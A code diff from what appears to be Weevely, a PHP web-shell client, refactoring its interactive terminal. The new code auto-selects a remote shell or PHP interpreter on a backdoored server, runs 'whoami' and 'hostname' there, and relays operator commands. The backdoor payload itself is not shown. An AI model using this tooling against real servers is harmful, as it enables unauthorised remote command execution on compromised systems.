@@ -9,63 +9,83 @@ import readline, atexit, os, re, shlex
 
 class Terminal():
     
-    def __init__( self, moddict, url, password, one_shot = False):
+    def __init__( self, modhandler, one_shot = False):
 
-        self.moddict = moddict
+        self.modhandler = modhandler
         
-        self.url = url
-        self.password = password
-        self.interpreter = 'system.exec'
+        self.url = modhandler.url
+        self.password = modhandler.password
+        self.interpreter = None
         self.module_string = ':module'
         self.help_string = ':help'
         self.one_shot = one_shot
-        self.history      = os.path.expanduser( '~/.weevely_history' )
         self.completions = {}
-        
                 
+        self.__get_best_interpreter_available()
+        
         if not one_shot:
             
+            self.history      = os.path.expanduser( '~/.weevely_history' )
+
             try:
-                self.moddict.load('system.exec', url, password)
-                self.moddict.load('system.info', url, password)
+                readline.parse_and_bind( 'tab: menu-complete' )
+                readline.set_completer( self.__complete )
+                readline.read_history_file( self.history )
+            except IOError:
+                pass
     
-            except ModuleException, e:
-                self.interpreter = None
-                self.prompt        = "[modules]$ " 
-                print '[%s][!] Error loading module: %s' % ('system.exec', e)
-                
-            else:
-                self.username      = self.moddict['system.info'].run("whoami")
-                self.hostname      = self.moddict['system.info'].run("hostname")
-                self.cwd           = self.moddict['system.info'].run("basedir")
-                self.cwd_extract = re.compile( "cd\s+(.+)", re.DOTALL )
+            atexit.register( readline.write_history_file, self.history )
+
+
+    def __get_best_interpreter_available(self):
+        
+        for shell_name in self.modhandler.module_info:
+            if shell_name.startswith('shell.'):
+        
+                try:
+                    self.modhandler.load(shell_name)
+                except ModuleException, e:
+                    print '[!] [%s] Error loading module: %s' % (shell_name, e)
+                else:
+                    self.interpreter = shell_name
+                    break
+
+        if self.interpreter == 'shell.sh':
             
-
-
-
-        try:
-            readline.parse_and_bind( 'tab: menu-complete' )
-            readline.set_completer( self.__complete )
-            readline.read_history_file( self.history )
-        except IOError:
-            pass
-
-        atexit.register( readline.write_history_file, self.history )
-
+            self.username      = self.modhandler.load('system.info').run("whoami")
+            self.hostname      = self.modhandler.load('system.info').run("hostname")
+            self.cwd           = self.modhandler.load('system.info').run("basedir")
+            self.cwd_extract = re.compile( "cd\s+(.+)", re.DOTALL )
+            self.prompt = "[shell.sh] %s@%s:%s$ "
+            print '[+] Using system shell interpreter \'%s\'' % self.interpreter
+            
+        elif self.interpreter == 'shell.php':
+            print '[+] Fallback to PHP interpreter \'%s\'.' % self.interpreter
+            self.prompt        = "[shell.php]$ "
+            
+        else:
+            print '[!] No backdoor found. Check url and password'
+            
 
     def loop(self):
         
-        while True:
+        while self.interpreter:
             
-            self.prompt        = "[system.exec] %s@%s:%s$ " % (self.username, self.hostname, self.cwd)
-            
-            cmd       = raw_input( self.prompt )
+            if self.interpreter == 'shell.sh':
+                prompt        = self.prompt % (self.username, self.hostname, self.cwd)
+            else:
+                prompt = self.prompt
+                
+            cmd       = raw_input( prompt )
             cmd       = cmd.strip()
             
             if cmd:
                 self.run_single(shlex.split(cmd))
             
     def run_single(self, cmd_split):
+    
+        if not self.interpreter:
+            return
             
         output = ''
         if cmd_split[0] == self.module_string:
@@ -81,23 +101,23 @@ class Terminal():
         elif cmd_split[0] == self.help_string:
             
             print ''
-            for mod_name in self.moddict.module_info:
-                if self.moddict.module_info[mod_name][0]:
-                    print "%s: %s" % (mod_name, self.moddict.module_info[mod_name][1])
+            for mod_name in self.modhandler.module_info:
+                if self.modhandler.module_info[mod_name][0]:
+                    print "%s: %s" % (mod_name, self.modhandler.module_info[mod_name][1])
             
             
         elif cmd_split[0] != self.module_string:
         
             cmd = ' '.join(cmd_split)
         
-            if not self.one_shot: 
+            if self.interpreter == 'shell.sh' and not self.one_shot: 
                 if self.__handleDirectoryChange(cmd) == False:
                     readline.add_history(cmd)
                     cmd = "cd %s && %s" % ( self.cwd, cmd )  
                 else:
                     cmd = "cd %s" % ( self.cwd )     
                     
-            output = self.run_module('system.exec', [ cmd ])  
+            output = self.run_module(self.interpreter, [ cmd ])  
             
         if output:
             print output
@@ -157,24 +177,24 @@ class Terminal():
 
     def run_module(self, module_name, module_arguments):
         
-        if module_name not in self.moddict.module_info.keys():
-            print '[%s][!] Error module not found' % (module_name)
+        if module_name not in self.modhandler.module_info.keys():
+            print '[!] [%s] Error module not found' % (module_name)
         else:
             try:
-                self.moddict.load(module_name, self.url, self.password)
+                module_arguments_requested = self.modhandler.load(module_name).len_arguments
             except ModuleException, e:
-                print '[%s][!] Error while loading: %s' % (module_name, e)   
+                print '[!] [%s] Error while loading: %s' % (e.module, e)   
             
             else: 
-                if self.moddict[module_name].len_arguments != len(module_arguments): 
-                    print '[%s][!] Error module needs %i arguments (not %i), printing documentation:\n' % (module_name, self.moddict[module_name].len_arguments, len(module_arguments))
-                    if self.moddict.module_info[module_name][0]: print '%s: %s' % (module_name, self.moddict.module_info[module_name][1])
+                if module_arguments_requested != len(module_arguments): 
+                    print '[!] [%s] Error module needs %i arguments (not %i), printing documentation:\n' % (module_name, module_arguments_requested, len(module_arguments))
+                    if self.modhandler.module_info[module_name][0]: print '%s: %s' % (module_name, self.modhandler.module_info[module_name][1])
                 
                 else:
                     try:
-                        return self.moddict[module_name].run(*module_arguments)
+                        return self.modhandler.load(module_name).run(*module_arguments)
                     except ModuleException, e:
-                        print '[%s][!] Error: %s' % (module_name, e) 
+                        print '[!] [%s] Error: %s' % (e.module, e) 
         
       
     
